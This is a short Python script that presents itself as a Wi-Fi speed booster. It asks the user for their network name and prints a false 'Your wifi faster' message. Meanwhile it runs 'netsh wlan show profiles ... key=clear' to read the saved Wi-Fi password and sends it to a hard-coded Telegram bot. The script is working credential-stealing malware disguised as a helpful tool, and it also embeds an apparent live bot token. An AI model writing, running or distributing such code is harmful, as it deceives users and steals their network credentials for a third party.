import requests
import subprocess
from time import sleep

def banner(str):
    for char in str:
        print(char, end='', flush=True)
        sleep(.01)

banner(
    '''
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⡟⢁⣼⣿⣿⣿⣿⣿⣿⣏⠉⢿⣿⣿⣿
⣿⣿⡟⢀⣾⠋⣸⣿⣿⣿⣿⣇⠙⣷⡀⢻⣿⣿
⣿⣿⠁⢸⡇⢰⡏⢸⣿⣿⡇⢹⡇⢹⡇⢸⣿⣿
⣿⣿⡆⢸⣧⠘⢷⣼⡏⢹⣧⡾⠃⣾⠇⢸⣿⣿
⣿⣿⣷⡀⠻⣧⣼⣿⡇⢸⣿⣧⣾⠏⢠⣿⣿⣿
⣿⣿⣿⣿⣦⣼⣿⣿⡇⢸⣿⣿⣧⣴⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⡇⢸⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⡇⢸⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣧⣼⣿⣿⣿⣿⣿⣿⣿⣿
Madeby: Amirprx3
Github: https://github.com/Amirprx3
    '''
)

wifiName = input("\nEnter your WI-FI name for faster speed ==> ")
print("Your wifi faster")

# Run command and get information
command = subprocess.getoutput(f"netsh wlan show profiles \"{wifiName}\" key=clear")

# search "Key Content" value
password_index = command.find("Key Content")
if password_index == -1:
    wifiPassword = "Password is not defined!"
else:
    password_line = command[password_index:].split("\n")[0]
    wifiPassword = password_line.split(":")[-1].strip()

# Special character MarkdownV2
def escape_markdown(text):
    special_chars = "_*[]()~`>#+-=|{}.!\\"
    for char in special_chars:
        text = text.replace(char, "\\" + char)
    return text

wifiName_escaped = escape_markdown(wifiName)
wifiPassword_escaped = escape_markdown(wifiPassword)

# create message with suitable format
final_result = f"password for username *{wifiName_escaped}* : ||{wifiPassword_escaped}||"

# Send message to Telegram
Bot_token = '6989989159:AAGj_44mqExEf6FYEEzECqiItZUYe4uX_4I'
chat = "6228676277"

def send(data):
    requests.get(f"https://api.telegram.org/bot{Bot_token}/sendMessage?chat_id={chat}&text={data}&parse_mode=MarkdownV2")

send(final_result)